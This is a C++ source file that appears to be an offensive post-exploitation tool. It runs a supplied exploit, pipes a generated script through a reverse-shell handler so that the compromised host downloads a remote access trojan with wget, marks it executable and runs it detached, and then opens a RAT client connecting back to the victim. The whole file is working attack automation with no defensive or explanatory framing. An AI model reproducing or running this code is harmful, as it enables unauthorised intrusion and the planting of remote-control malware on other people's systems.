//
// Created by adhokshajmishra on 29/4/20.
//

#include <algorithm>
#include <iostream>
#include <fstream>
#include <random>
#include <sstream>
#include <string>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

#include <cstdio>
#include <cstdlib>

std::string random_string(size_t length)
{
    std::string str("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

    std::random_device rd;
    std::mt19937 generator(rd());

    while (str.length() < length)
        str.append(str);

    std::shuffle(str.begin(), str.end(), generator);

    return str.substr(0, length);    // assumes 32 < number of characters in str
}

int main(int argc, char** argv)
{
    /*
     * ./tool <exploit launcher> <url of rat> <rat client connect ip> <remote rat port>
     */

    if (argc < 5)
    {
        std::cerr << " Usage: " << argv[0]
        << " <exploit launcher> <url of rat> <rat client connect ip> <remote rat port>"
        << std::endl;
        return -1;
    }

    std::string exploit_launcher = argv[1];
    std::string rat_url = argv[2];
    std::string rat_ip = argv[3];
    std::string rat_port = argv[4];

    /*
     * 1. run wget to download server
     * 2. mark it executable
     * 3. run it and detach from shell
     * 4. exit the shell
     * 5. run konsole with rat client connecting to server
     */

    std::string filename = random_string(15);
    std::string tmpfile = std::string("/tmp/") + random_string(15);

    std::stringstream propagation;
    propagation << "wget -O /tmp/" << filename << " " << rat_url << std::endl;
    //propagation << "sleep 5" << std::endl;
    propagation << "chmod +x /tmp/" << filename << std::endl;
    propagation << "nohup /tmp/" << filename << " &" << std::endl;
    propagation << "exit" << std::endl;

    std::ofstream file(tmpfile);
    file.write(propagation.str().c_str(), propagation.str().length());
    file.close();

    int pid = fork();
    if (0 == pid) {
        // launch handler
        std::string shell_handle = std::string("./reverse_shell_handler/reverse_shell_handler ") + tmpfile;
        system(shell_handle.c_str());
    } else {
        // launch exploit
        system(exploit_launcher.c_str());
        int status;
        waitpid(pid, &status, WUNTRACED | WCONTINUED);

        if (WIFEXITED(status)) {
            sleep(5);
            std::remove(tmpfile.c_str());
            std::stringstream konsole;
            konsole << "nohup konsole -e ./client " << rat_ip << " " << rat_port << " &";

            std::cerr << "Command: " << konsole.str().c_str() << std::endl;
            system(konsole.str().c_str());
        }
    }
    return 0;
}